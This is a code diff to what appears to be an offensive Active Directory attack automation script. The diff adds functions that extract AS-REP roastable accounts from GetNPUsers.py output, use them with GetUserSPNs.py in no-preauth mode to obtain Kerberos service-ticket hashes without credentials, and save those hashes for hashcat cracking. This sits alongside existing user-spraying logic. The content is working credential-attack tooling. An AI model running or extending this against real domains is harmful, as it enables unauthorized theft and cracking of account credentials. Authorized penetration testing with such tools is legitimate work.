@@ -23,6 +23,74 @@ def _get_np_users_args(domain: str, target: str, users_file: str, kerberos: bool
     return cmd
 
 
+def _extract_asrep_roastable_users(output: str) -> list:
+    """Extract unique usernames from GetNPUsers.py AS-REP hash output."""
+    if not output:
+        return []
+
+    users = []
+    seen = set()
+    for match in re.finditer(r"^\$krb5asrep\$(?:\d+\$)?([^@\s:]+)@[^:\s]+:", output, re.MULTILINE | re.IGNORECASE):
+        username = match.group(1)
+        key = username.lower()
+        if key in seen:
+            continue
+        seen.add(key)
+        users.append(username)
+    return users
+
+
+def _get_user_spns_no_preauth_args(domain: str, fqdn: str, users_file: str, roastable_user: str):
+    """Build a safe argv list for no-preauth GetUserSPNs.py requests."""
+    return [
+        "GetUserSPNs.py",
+        "-no-preauth",
+        roastable_user,
+        "-usersfile",
+        users_file,
+        "-dc-host",
+        fqdn,
+        f"{domain}/",
+    ]
+
+
+def request_spns_with_asrep_roastable_users(output: str, domain: str, fqdn: str, users_file: str) -> int:
+    """
+    Use AS-REP roastable users to request SPN TGS hashes without credentials.
+
+    GetUserSPNs.py supports a -no-preauth mode where one no-preauth account can
+    request service tickets for users/SPNs listed in -usersfile.
+    """
+    roastable_users = _extract_asrep_roastable_users(output)
+    if not roastable_users:
+        return 0
+
+    if not fqdn:
+        print_status("[!] Skipping no-auth SPN requests: missing FQDN for -dc-host.")
+        return 0
+
+    combined_output = []
+    for roastable_user in roastable_users:
+        spn_output, _ = run_command(
+            _get_user_spns_no_preauth_args(domain, fqdn, users_file, roastable_user),
+            f"Request SPNs without authentication using AS-REP roastable account {roastable_user}",
+            capture_output=True,
+        )
+        if spn_output:
+            combined_output.append(spn_output)
+
+    if not combined_output:
+        return 0
+
+    return save_hashes(
+        "\n".join(combined_output),
+        r'(\$krb5tgs\$.+)$',
+        "kerberoast_hashes.txt",
+        13100,
+        "no-auth Kerberoast"
+    )
+
+
 def save_hashes(output, pattern, filename, hashcat_mode, hash_type):
     """
     Parse hashes from tool output, save to file, print crack commands.
@@ -127,6 +195,7 @@ def try_user_file(
 def user_spraying(
     r: str,
     d: str,
+    f: str = None,
     u: str = None,
     p: str = None,
     k: bool = False,
@@ -138,6 +207,7 @@ def user_spraying(
     Args:
         r: Target IP address
         d: Domain name (e.g., CORP.LOCAL)
+        f: Fully qualified domain name of DC
         u: Username (None if no credentials provided)
         p: Password (None if no credentials provided)
         k: Boolean indicating if Kerberos authentication is enabled
@@ -184,6 +254,7 @@ def user_spraying(
                         18200,
                         "AS-REP"
                     )
+                    request_spns_with_asrep_roastable_users(output, d, f, users_file)
             else:
                 print_status(f"\n[INFO] '{USERS_FILE}' not found — skipping AS-REP Roasting.")
             
@@ -210,6 +281,7 @@ def user_spraying(
             18200,
             "AS-REP"
         )
+        request_spns_with_asrep_roastable_users(output, d, f, users_file)
 
     # Get password policy before spraying to check lockout thresholds
     policy = get_password_policy(r, u, p, k)
